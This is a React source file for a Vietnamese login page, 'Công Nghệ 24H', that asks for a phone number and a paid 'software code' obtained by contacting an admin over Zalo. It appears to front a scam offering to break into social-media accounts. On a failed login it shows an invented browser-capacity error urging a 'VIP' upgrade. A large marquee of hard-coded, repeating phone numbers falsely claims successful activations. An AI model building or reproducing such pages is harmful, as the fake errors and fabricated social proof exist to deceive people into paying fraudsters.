import ProgressBar from 'components/ProcessBar';
import { useEffect, useState } from 'react';
import { useForm } from 'react-hook-form';
import PhoneInput from 'react-phone-input-2';
import 'react-phone-input-2/lib/style.css';
import { useNavigate } from 'react-router-dom';
import { apiLogin } from './api/apiStore';
import './style/homepage.scss';
const img1 = require('assets/images/img1.jpg');
const img2 = require('assets/images/img2.jpg');
const img3 = require('assets/images/img3.png');
const img4 = require('assets/images/img4.jpg');
const img5 = require('assets/images/img5.jpg');
const img6 = require('assets/images/img6.jpg');
const video_bg = require('assets/images/video_background.mp4');

interface Payload {
  phone: string;
  code: string;
}

const Login = () => {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isProcess, setIsProcess] = useState(false);
  const [isCode, setIsCode] = useState(false);
  const [phone, setPhone] = useState<string>('');
  const [isPhone, setIsPhone] = useState(false);
  const navigate = useNavigate();
  const {
    register,
    formState: { errors },
    handleSubmit,
    setValue,
  } = useForm<Payload>({
    defaultValues: {
      phone: '',
      code: '',
    },
  });

  useEffect(() => {
    localStorage.clear();
  }, []);

  const handleChangePhone = (phone: string) => {
    setValue('phone', phone);
    if (phone !== '') {
      setIsPhone(false);
    }
    setPhone(phone);
  };
  const onSubmit = async (data: any) => {
    setIsSubmitting(true);
    if (isSubmitting) return;
    if (data.phone === '') {
      setIsSubmitting(false);
      return setIsPhone(true);
    }
    try {
      const res = await apiLogin(data);
      if (res) {
        setIsProcess(true);
        setTimeout(() => {
          navigate('/taikhoan');
          setIsProcess(false);
        }, 3500);
      }
    } catch (error) {
      setIsCode(true);
      // toast.error('Bạn cần nâng cấp gói cước để phá bảo mật thông tin..!', {
      //   className: 'custom_toast',
      // });
    } finally {
      setIsSubmitting(false);
    }
  };
  return (
    <div className="home_page login_page">
      <video autoPlay muted loop playsInline className="bg-video">
        <source src={video_bg} type="video/mp4" />
      </video>
      <div className="container">
        <div className="container_title container_title--login ">
          <h2>Công Nghệ 24H</h2>
        </div>
        <div className="box_form">
          <h3>ĐĂNG NHẬP HỆ THỐNG</h3>
          <div className="card_list">
            <div className="card_item">
              <a href="dangnhap">
                <img src={img1} alt="Khối hình ảnh mạng xã hội" className="w-100" />
              </a>
            </div>
            <div className="card_item">
              <a href="dangnhap">
                <img src={img2} className="w-100" />
              </a>
            </div>
            <div className="card_item">
              <a href="dangnhap">
                <img src={img3} className="w-100" />
              </a>
            </div>
            <div className="card_item">
              <a href="dangnhap">
                <img src={img4} className="w-100" />
              </a>
            </div>
            <div className="card_item">
              <a href="dangnhap">
                <img src={img5} className="w-100" />
              </a>
            </div>
            <div className="card_item">
              <a href="dangnhap">
                <img src={img6} className="w-100" />
              </a>
            </div>
          </div>
          {isProcess ? (
            <>
              <ProgressBar isSubmitting={isSubmitting} />
              <div className="box_message">Hệ thống đang xử lí vui lòng chờ trong ít phút !</div>
            </>
          ) : (
            <form className="form_login" autoComplete="off" onSubmit={handleSubmit(onSubmit)}>
              <label className="form-label mb-16">Số Điện Thoại:</label>
              <PhoneInput country={'vn'} value={phone} onChange={(phone) => handleChangePhone(phone)} />
              {isPhone && <p className="error_message">{'Nhập số điện thoại'}</p>}
              <label className="form-label my-16">Mã phần mềm - nhận tại Hotline/Zalo: admin</label>
              <input
                {...register('code', { required: 'Không được để trống !' })}
                className="form_input mb-16"
                type="password"
                placeholder="Nhập mã phần mềm"
              />
              {errors.code && <p className="error_message">{errors.code.message}</p>}
              {isCode && (
                <p className="error_message">
                  Xin lỗi safari hoặc google của bạn k đủ dung lượng để tải dữ liệu , đề nghị nâng cấp mã vip để xem nội
                  dung.
                </p>
              )}
              <button type="submit" className="btn_submit">
                Đăng nhập
              </button>
            </form>
          )}

          <div className="marquee-wrapper">
            <div className="marquee-content">
              {Array(2)
                .fill(0)
                .map((_, idx) => (
                  <div className="marquee-block" key={idx}>
                    <p>Tài khoản: 0911.340.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0912.757.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0913.825.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0824.175.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0967.785.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0394.145.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0872.053.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0972.053.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0971.147.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0973.256.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0961.862.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0962.751.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0963.142.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0353.174.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0356.178.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0882.710.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0982.530.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0972.320.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0908.752.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0282.574.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0762.036.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0828.520.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0353.860.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0356.508.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0362.568.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0868.786.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0369.174.xxx Đã Kích Hoạt Thành Công</p>
                    <p> Tài khoản:0972.340.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0982.540.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0983.314.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0394.145.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0872.053.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0972.053.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0971.147.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0973.256.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0961.862.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0962.751.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0963.142.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0353.174.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0356.178.xxx Đã Kích Hoạt Thành Công</p>
                    <p> Tài khoản:0397.142.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0369.742.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0971.120.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0969.380.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0585.360.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0858.240.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0911.340.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0912.757.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0913.825.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0824.175.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0967.785.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0394.145.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0872.053.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0972.053.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0971.147.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0973.256.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0961.862.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0962.751.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0963.142.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0353.174.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0356.178.xxx Đã Kích Hoạt Thành Công</p>
                    <p> Tài khoản:0397.142.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0369.742.xxx Đã Kích Hoạt Thành Công</p>
                    <p> Tài khoản:0972.340.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0982.540.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0983.314.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0971.120.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0969.380.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0585.360.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0858.240.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0911.340.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0912.757.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0913.825.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0824.175.xxx Đã Kích Hoạt Thành Công</p>
                    <p>Tài khoản: 0967.785.xxx Đã Kích Hoạt Thành Công</p>
                  </div>
                ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;
